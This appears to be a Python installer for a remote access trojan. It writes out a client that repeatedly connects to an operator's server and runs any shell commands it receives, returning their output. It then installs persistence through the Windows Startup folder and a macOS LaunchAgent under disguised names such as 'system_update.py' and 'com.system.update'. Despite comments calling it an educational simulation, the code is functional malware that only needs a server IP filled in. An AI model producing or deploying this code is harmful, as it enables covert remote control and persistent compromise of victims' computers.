import os
import sys
import subprocess
import shutil
import platform

CLIENT_CODE = """import socket
import subprocess
import os
import sys
import time

# CONFIGURATION
SERVER_IP = '127.0.0.0'  # REPLACE WITH YOUR SERVER IP
SERVER_PORT = 9999

def connect():
    while True:
        try:
            print(f"[*] Attempting to connect to {SERVER_IP}:{SERVER_PORT}...")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, SERVER_PORT))
            print("[+] Connection established successfully!")
            return s
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            print("[*] Waiting 10 seconds before retrying...")
            time.sleep(10)

def main():
    print("--- RAT Client Started ---")
    print("Waiting for commands. Will display received commands below.")
    
    while True:
        try:
            socket_conn = connect()
            while True:
                # Receive command
                command = socket_conn.recv(1024).decode()
                
                if command.lower() == 'exit':
                    print("[!] Received 'exit' command. Closing connection.")
                    socket_conn.close()
                    break
                
                # --- DEBUG/ECHO FEATURE START ---
                # Print the received command to the local terminal
                print(f"\n[RECEIVED COMMAND]: {command}")
                # --- DEBUG/ECHO FEATURE END ---

                # Execute command
                try:
                    result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=30)
                    output = result
                except subprocess.CalledProcessError as e:
                    output = e.output
                except Exception as e:
                    output = str(e).encode()
                
                # Send result back to server
                socket_conn.send(output)
                print("[*] Command executed and output sent.")
                
        except Exception as e:
            print(f"[-] Connection lost or error occurred: {e}")
            print("[*] Reconnecting in 5 seconds...")
            time.sleep(5)

if __name__ == "__main__":
    main()
"""

def get_install_path():
    system = platform.system()
    if system == "Windows":
        return os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    elif system == "Darwin":
        return os.path.expanduser("~/Library/LaunchAgents")
    elif system == "Linux":
        # Attempting systemd for modern Linux, fallback to ~/.config/autostart not implemented for simplicity
        # For educational demo, we'll use a simple script in /usr/local/bin and suggest manual systemd setup
        return "/usr/local/bin"
    return None

def install_persistence(script_path):
    system = platform.system()
    script_name = os.path.basename(script_path)
    
    try:
        if system == "Windows":
            # Windows: Copy to Startup folder
            startup_path = get_install_path()
            dest_path = os.path.join(startup_path, "system_update.py")
            shutil.copy(script_path, dest_path)
            print(f"[+] Installed to Windows Startup: {dest_path}")
            
        elif system == "Darwin":
            # macOS: Create a LaunchAgent
            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>"""
            plist_path = os.path.expanduser("~/Library/LaunchAgents/com.system.update.plist")
            with open(plist_path, 'w') as f:
                f.write(plist_content)
            subprocess.call(['launchctl', 'load', plist_path])
            print(f"[+] Installed macOS LaunchAgent: {plist_path}")
            
        elif system == "Linux":
            # Linux: Basic persistence attempt (requires sudo)
            print("[*] Linux persistence requires root. Skipping automatic service creation for safety in this demo.")
            print(f"[!] Manual Step: Add 'python3 {script_path}' to your startup applications or create a systemd service.")
            
    except Exception as e:
        print(f"[-] Failed to install persistence: {e}")

def main():
    print("[*] RAT Client Installer")
    print("[*] Checking for Python...")
    
    if not shutil.which("python3") and not shutil.which("python"):
        print("[-] Error: Python is not installed or not in PATH. This installer cannot proceed.")
        sys.exit(1)
        
    python_cmd = "python3" if shutil.which("python3") else "python"
    
    # Create the client script
    script_name = "system_helper.py" # Disguised name
    script_path = os.path.join(os.getcwd(), script_name)
    
    print(f"[*] Creating {script_name}...")
    with open(script_path, "w") as f:
        f.write(CLIENT_CODE) # Note: Variable name typo in original thought, fixed here to CLIENT_CODE
        
    # Fix the variable reference error from the thought block
    with open(script_path, "w") as f:
        f.write(CLIENT_CODE)
    
    print(f"[+] Created {script_path}")
    
    # Install persistence
    print("[*] Attempting to install persistence...")
    install_persistence(script_path)
    
    print("\n[!] WARNING: This is a simulation. The client will not connect until you edit SERVER_IP in the generated file.")
    print(f"[!] To run manually: {python_cmd} {script_path}")

if __name__ == "__main__":
    main()
